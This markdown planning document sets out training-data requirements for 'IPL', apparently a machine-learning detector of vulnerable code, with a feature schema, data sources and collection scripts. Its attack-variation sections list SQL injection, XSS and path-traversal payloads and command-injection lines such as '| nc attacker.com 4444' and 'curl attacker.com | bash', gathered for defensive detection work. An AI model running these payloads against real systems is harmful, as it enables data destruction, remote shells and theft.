# IPL ML Training Data Requirements

## EXECUTIVE SUMMARY

**IPL needs 10,000-100,000 labeled code samples to reach 90%+ accuracy.**

Current: 173 synthetic samples (46% accuracy)
Target: 10,000+ real-world samples (90%+ accuracy)

---

## DATA STRUCTURE REQUIRED

### **Per Sample: 64 Features + Label**

Each training sample needs:

```json
{
  "id": "sample_001",
  "code": "let user_input = 'admin'; db_write('users', user_input);",
  "features": {
    // Code Structure Features (8 features)
    "num_nodes": 10,
    "num_edges": 15,
    "avg_degree": 3.0,
    "cyclomatic_complexity": 5,
    "nesting_depth": 2,
    "function_count": 1,
    "loop_count": 0,
    "statement_count": 10,

    // Taint/Security Features (8 features)
    "has_untrusted_data": 1,
    "has_sanitization": 0,
    "taint_propagation_steps": 5,
    "sql_sink_count": 1,
    "html_sink_count": 0,
    "shell_sink_count": 0,
    "file_sink_count": 0,
    "sink_kind": "sql",

    // Execution Features (4 features)
    "execution_count": 50,
    "avg_execution_time_ms": 10.0,
    "memory_usage_mb": 50.0,
    "cpu_usage_percent": 5.0,

    // Pattern Features (10 features)
    "pattern_match_score": 0.8,
    "pattern_confidence": 0.7,
    "suspicious_keywords": 1,
    "credential_keywords": 0,
    "injection_keywords": 1,
    "bypass_keywords": 0,
    "attack_keywords": 1,
    "api_call_count": 5,
    "external_call_count": 2,
    "system_call_count": 0,

    // Context Features (15 features)
    "module_imports": 3,
    "external_dependencies": 2,
    "file_operations": 1,
    "network_operations": 0,
    "database_operations": 1,
    "user_input_sources": 1,
    "data_transformations": 2,
    "error_handling": 0,
    "logging_calls": 0,
    "validation_calls": 0,
    "config_access": 0,
    "env_var_access": 0,
    "file_read": 0,
    "file_write": 1,
    "network_send": 0,

    // Historical Features (5 features)
    "historical_safety_rate": 0.5,
    "historical_optimization_success": 0.6,
    "similar_pattern_safe_count": 10,
    "similar_pattern_dangerous_count": 5,
    "context_frequency": 0.3,

    // Attack-Specific Features (14 features)
    "sql_injection_score": 0.9,
    "xss_score": 0.0,
    "csrf_score": 0.0,
    "command_injection_score": 0.0,
    "path_traversal_score": 0.0,
    "buffer_overflow_score": 0.0,
    "format_string_score": 0.0,
    "race_condition_score": 0.0,
    "privilege_escalation_score": 0.0,
    "information_disclosure_score": 0.0,
    "denial_of_service_score": 0.0,
    "authentication_bypass_score": 0.0,
    "session_hijacking_score": 0.0,
    "crypto_weakness_score": 0.0,
    "insecure_randomness_score": 0.0
  },
  "label": "dangerous",
  "attack_type": "sql_injection",
  "severity": "high",
  "cwe_id": "CWE-89",
  "source": "CVE-2023-1234"
}
```

---

## REQUIRED DATA CATEGORIES

### **1. SAFE CODE SAMPLES (50% of dataset)**

**What it includes:**
- Code with no untrusted data
- Code with proper sanitization
- Code with parameterized queries
- Code with input validation
- Code with secure APIs

**Examples:**
```python
# Safe: No untrusted data
let constant = "hardcoded_value";
db_write("users", constant);

# Safe: Proper sanitization
let user_input = get_user_input();
let sanitized = sanitize_for_sql(user_input);
db_write("users", sanitized);

# Safe: Parameterized query
let user_id = get_user_id();
db_query("SELECT * FROM users WHERE id = ?", [user_id]);
```

**Quantity needed:** 5,000-50,000 samples

---

### **2. DANGEROUS CODE SAMPLES (50% of dataset)**

**What it includes:**
- SQL injection payloads
- XSS payloads
- Command injection payloads
- Path traversal payloads
- CSRF attacks
- Buffer overflow attempts
- Privilege escalation attempts

**Examples:**
```python
# SQL Injection
let user_input = "admin' OR '1'='1";
db_write("users", user_input);

# XSS
let user_input = "<script>alert('XSS')</script>";
html_render(user_input);

# Command Injection
let user_input = "; rm -rf /";
shell_exec(user_input);

# Path Traversal
let user_input = "../../etc/passwd";
file_read(user_input);
```

**Quantity needed:** 5,000-50,000 samples

---

### **3. ATTACK VARIATIONS (Crucial for robustness)**

**For each attack type, need variations:**

#### **SQL Injection Variations (1,000+ samples)**
```sql
-- Classic
' OR '1'='1
" OR "1"="1
admin'--

-- Union-based
' UNION SELECT * FROM users--
' UNION SELECT NULL, NULL--

-- Blind
' AND 1=1--
' AND 1=2--
' AND SLEEP(5)--

-- Stacked
'; DROP TABLE users--
'; DELETE FROM users--

-- Second-order
(various techniques)

-- Time-based
' AND WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
```

#### **XSS Variations (1,000+ samples)**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<div onmouseover=alert('XSS')>
<iframe src='javascript:alert(1)'>
<input autofocus onfocus=alert(1)>

-- DOM-based
document.location.hash
document.cookie
innerHTML assignments
eval() calls
```

#### **Command Injection Variations (1,000+ samples)**
```bash
; rm -rf /
&& cat /etc/passwd
| nc attacker.com 4444
$(reboot)
`whoami`
; wget http://evil.com/shell.sh
&& bash shell.sh
| python exploit.py
$(curl attacker.com)
`curl attacker.com | bash
```

**Quantity needed:** 10,000+ attack variations

---

### **4. CONTEXTUAL DATA (For realistic training)**

**What it includes:**
- Source code files (not just snippets)
- File context (surrounding code)
- Function context (called from where)
- Variable usage context (where data flows)
- API usage context (which libraries used)

**Example:**
```json
{
  "file": "user_controller.py",
  "function": "handle_login",
  "line": 45,
  "context": {
    "imports": ["flask", "database"],
    "function_calls": ["get_user_input", "db_query"],
    "variable_flows": {
      "username": ["request.form", "db_query"],
      "password": ["request.form", "hash_function", "db_query"]
    }
  }
}
```

**Quantity needed:** 10,000+ contextual samples

---

### **5. METADATA (For learning patterns)**

**What it includes:**
- Attack type classification
- Severity level
- CWE (Common Weakness Enumeration) ID
- CVE ID (if from vulnerability database)
- Source (CVE, exploit-db, manual)
- Language (Python, JavaScript, etc.)
- Framework (Flask, Django, Express, etc.)
- Date added

**Example:**
```json
{
  "attack_type": "sql_injection",
  "severity": "high",
  "cwe_id": "CWE-89",
  "cve_id": "CVE-2023-1234",
  "source": "CVE",
  "language": "python",
  "framework": "flask",
  "date_added": "2023-10-01"
}
```

**Quantity needed:** 10,000+ with metadata

---

## DATA SOURCES

### **PUBLIC DATABASES (FREE)**

#### **1. CVE Database (cve.mitre.org)**
- **Size:** 200,000+ vulnerabilities
- **Data:** Vulnerability descriptions, CWE IDs, severity
- **Format:** JSON, XML
- **Access:** Free API
- **Extract:** Attack patterns, vulnerable code samples

**What to extract:**
- SQL injection CVEs → 5,000+ samples
- XSS CVEs → 5,000+ samples
- Command injection CVEs → 2,000+ samples
- Other injection CVEs → 3,000+ samples

---

#### **2. NVD (National Vulnerability Database)**
- **Size:** 150,000+ vulnerabilities
- **Data:** Detailed vulnerability descriptions, CVSS scores
- **Format:** JSON, XML
- **Access:** Free API
- **Extract:** Attack patterns, severity scores

---

#### **3. Exploit-DB (exploit-db.com)**
- **Size:** 50,000+ exploits
- **Data:** Real exploit code, PoC (Proof of Concept)
- **Format:** Text, code
- **Access:** Free (with registration)
- **Extract:** Actual attack payloads, exploitation techniques

---

#### **4. OWASP (owasp.org)**
- **Size:** Hundreds of samples
- **Data:** Security patterns, attack samples
- **Format:** Documentation, code
- **Access:** Free
- **Extract:** Best practices, common attack patterns

---

### **SECURITY BLOGS & FORUMS (FREE)**

#### **5. Security Blogs**
- KrebsOnSecurity
- Threatpost
- BleepingComputer
- The Hacker News
- **Extract:** Real attack scenarios, discussion of vulnerabilities

---

#### **6. Reddit**
- r/netsec
- r/AskNetsec
- r/Python
- r/webdev
- **Extract:** User-reported issues, code examples

---

#### **7. Stack Overflow**
- Security-related questions
- Code with vulnerabilities
- **Extract:** Vulnerable code patterns, fixes

---

### **GENERATED DATA (FAST)**

#### **8. Mutation-Based Variations**
- Take base attack payloads
- Generate variations using mutations
- **Size:** Unlimited
- **Example:** `' OR '1'='1` → `" OR "1"="1`, `admin'--`, `1' AND 1=1--`

---

#### **9. Fuzzing**
- Use fuzzing tools (AFL, libFuzzer)
- Generate random inputs
- **Size:** Unlimited
- **Extract:** Edge cases, unexpected patterns

---

#### **10. Synthesis**
- Use attack libraries (sqlmap, Metasploit)
- Generate attack patterns
- **Size:** Unlimited
- **Extract:** Sophisticated attack techniques

---

## DATA COLLECTION PIPELINE

### **Phase 1: Automated Collection (Week 1)**

```python
# 1. Download CVE data
import requests
cve_data = requests.get("https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection")

# 2. Parse and extract
for cve in cve_data:
    if "sql injection" in cve.description:
        code_samples = extract_code_samples(cve.description)
        for sample in code_samples:
            extract_features(sample)
            label_sample(sample, "dangerous")

# 3. Save to database
save_to_jsonl("training_data.jsonl")
```

**Output:** 10,000+ samples

---

### **Phase 2: Manual Labeling (Week 2)**

**What needs manual labeling:**
- Ambiguous cases
- False positives
- New attack patterns
- Context-specific decisions

**Process:**
1. Automated labeling (80% accuracy)
2. Manual review (correct errors)
3. Expert validation (verify edge cases)

**Output:** High-quality labeled dataset

---

### **Phase 3: Feature Extraction (Week 2)**

```python
def extract_features(code_sample):
    """Extract 64 features from code"""
    features = {}

    # Code structure
    features['num_nodes'] = count_ast_nodes(code_sample)
    features['num_edges'] = count_ast_edges(code_sample)
    features['avg_degree'] = calculate_avg_degree(code_sample)

    # Taint analysis
    features['has_untrusted_data'] = detect_untrusted_data(code_sample)
    features['has_sanitization'] = detect_sanitization(code_sample)
    features['taint_propagation_steps'] = analyze_taint_flow(code_sample)

    # Sinks
    features['sql_sink_count'] = count_sql_sinks(code_sample)
    features['html_sink_count'] = count_html_sinks(code_sample)
    features['shell_sink_count'] = count_shell_sinks(code_sample)

    # Attack patterns
    features['sql_injection_score'] = detect_sql_injection(code_sample)
    features['xss_score'] = detect_xss(code_sample)
    features['command_injection_score'] = detect_command_injection(code_sample)

    # ... more features

    return features
```

**Output:** 64-dimensional feature vectors

---

### **Phase 4: Data Validation (Week 3)**

**Quality checks:**
1. **Label consistency:** Same code should have same label
2. **Feature completeness:** All 64 features present
3. **No duplicates:** Remove duplicate samples
4. **Balance:** 50% safe, 50% dangerous
5. **Diversity:** Cover all attack types

**Output:** Clean, validated dataset

---

## DATA FORMAT FOR IPL

### **JSONL Format (one sample per line)**

```jsonl
{"id": "sample_001", "features": [0.1, 0.0, 0.05, ...], "label": 1, "attack_type": "sql_injection"}
{"id": "sample_002", "features": [0.0, 0.1, 0.0, ...], "label": 0, "attack_type": "safe"}
{"id": "sample_003", "features": [0.2, 0.0, 0.1, ...], "label": 1, "attack_type": "xss"}
```

**Label encoding:**
- 0 = safe
- 1 = dangerous

---

## ESTIMATED DATA REQUIREMENTS

### **Minimum Viable Dataset (MVP)**
- **Size:** 10,000 samples
- **Composition:** 5,000 safe + 5,000 dangerous
- **Attack types:** 5 major types (SQLi, XSS, CMDi, Path Traversal, CSRF)
- **Expected accuracy:** 75-80%
- **Time to collect:** 1-2 weeks

---

### **Good Quality Dataset**
- **Size:** 50,000 samples
- **Composition:** 25,000 safe + 25,000 dangerous
- **Attack types:** 10 major types + variations
- **Expected accuracy:** 85-90%
- **Time to collect:** 3-4 weeks

---

### **Production Quality Dataset**
- **Size:** 100,000+ samples
- **Composition:** 50,000 safe + 50,000 dangerous
- **Attack types:** All major types + edge cases
- **Expected accuracy:** 90-95%
- **Time to collect:** 5-8 weeks

---

## CURRENT VS TARGET

| Metric | Current | Target | Gap |
|--------|---------|--------|-----|
| Total samples | 173 | 10,000 | 9,827 |
| Safe samples | ~100 | 5,000 | 4,900 |
| Dangerous samples | ~73 | 5,000 | 4,927 |
| Attack types | 3 | 10 | 7 |
| Accuracy | 46% | 90% | 44% |
| Data source | Synthetic | Real-world | N/A |

---

## PRIORITY DATA TO COLLECT

### **High Priority (Week 1)**
1. **SQL Injection samples** - 2,000 samples
   - Source: CVE, Exploit-DB
   - Variations: Classic, union-based, blind, stacked

2. **XSS samples** - 2,000 samples
   - Source: CVE, OWASP
   - Variations: Reflected, stored, DOM-based

3. **Safe code samples** - 2,000 samples
   - Source: Open source projects
   - Types: Parameterized queries, sanitized input

---

### **Medium Priority (Week 2)**
4. **Command Injection samples** - 1,000 samples
5. **Path Traversal samples** - 1,000 samples
6. **CSRF samples** - 1,000 samples
7. **Contextual samples** - 1,000 samples

---

### **Low Priority (Week 3-4)**
8. **Buffer Overflow samples** - 500 samples
9. **Privilege Escalation samples** - 500 samples
10. **Other injection samples** - 500 samples
11. **Edge cases** - 500 samples

---

## DATA COLLECTION SCRIPT EXAMPLE

```python
"""
Automated data collection for IPL training
"""
import requests
import json
from bs4 import BeautifulSoup

def collect_cve_data(keyword, limit=1000):
    """Collect CVE data for specific attack type"""
    url = f"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={keyword}"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    samples = []
    for cve in soup.find_all('div', class_='vuln-summary')[:limit]:
        cve_id = cve.find('a').text
        description = cve.text

        # Extract code samples from description
        code_samples = extract_code_from_text(description)

        for code in code_samples:
            features = extract_features(code)
            label = determine_label(keyword, code)
            samples.append({
                'id': f"{cve_id}_{len(samples)}",
                'code': code,
                'features': features,
                'label': label,
                'attack_type': keyword,
                'source': 'CVE'
            })

    return samples

def generate_variations(base_payload, n=100):
    """Generate variations of attack payload"""
    variations = []

    # Case variations
    variations.append(base_payload.upper())
    variations.append(base_payload.lower())
    variations.append(base_payload.capitalize())

    # Encoding variations
    variations.append(encode_url(base_payload))
    variations.append(encode_hex(base_payload))

    # Structural variations
    variations.append(base_payload.replace("'", '"'))
    variations.append(base_payload.replace("--", "#"))

    # Padding variations
    variations.append("  " + base_payload)
    variations.append(base_payload + "  ")

    return variations[:n]

def main():
    """Main data collection pipeline"""
    all_samples = []

    # Collect CVE data
    print("Collecting CVE data...")
    for keyword in ['sql injection', 'xss', 'command injection']:
        samples = collect_cve_data(keyword, limit=500)
        all_samples.extend(samples)

    # Generate variations
    print("Generating variations...")
    for sample in all_samples[:1000]:  # Limit for speed
        variations = generate_variations(sample['code'], n=10)
        for var in variations:
            features = extract_features(var)
            all_samples.append({
                'id': f"var_{len(all_samples)}",
                'code': var,
                'features': features,
                'label': sample['label'],
                'attack_type': sample['attack_type'],
                'source': 'generated'
            })

    # Add safe samples
    print("Adding safe samples...")
    safe_samples = generate_safe_samples(2000)
    all_samples.extend(safe_samples)

    # Save to JSONL
    print(f"Saving {len(all_samples)} samples...")
    with open('training_data.jsonl', 'w') as f:
        for sample in all_samples:
            f.write(json.dumps(sample) + '\n')

    print(f"Done! Collected {len(all_samples)} samples")

if __name__ == "__main__":
    main()
```

---

## NEXT STEPS

### **Week 1: Quick Start**
1. Download CVE database (2 hours)
2. Extract SQL injection samples (4 hours)
3. Extract XSS samples (4 hours)
4. Generate variations (4 hours)
5. Add safe samples (4 hours)
6. **Result:** 5,000 samples

### **Week 2: Expansion**
1. Collect Exploit-DB data (8 hours)
2. Collect OWASP samples (4 hours)
3. Scrape security blogs (8 hours)
4. Manual labeling review (8 hours)
5. **Result:** 10,000 samples

### **Week 3-4: Production**
1. Collect all attack types (16 hours)
2. Generate comprehensive variations (16 hours)
3. Manual validation (16 hours)
4. Feature extraction (16 hours)
5. **Result:** 50,000+ samples

---

## CONCLUSION

**IPL needs 10,000-100,000 labeled code samples to reach 90%+ accuracy.**

**Data sources:**
- CVE database (200,000+ vulnerabilities)
- NVD (150,000+ vulnerabilities)
- Exploit-DB (50,000+ exploits)
- OWASP (hundreds of samples)
- Security blogs/forums (unlimited)

**Data types:**
- Safe code (50%)
- Dangerous code (50%)
- Attack variations (SQLi, XSS, CMDi, etc.)
- Contextual data
- Metadata

**Time to collect:**
- MVP (10,000 samples): 1-2 weeks
- Good quality (50,000 samples): 3-4 weeks
- Production (100,000+ samples): 5-8 weeks

**The bottleneck is not data availability** - it's data collection and labeling.
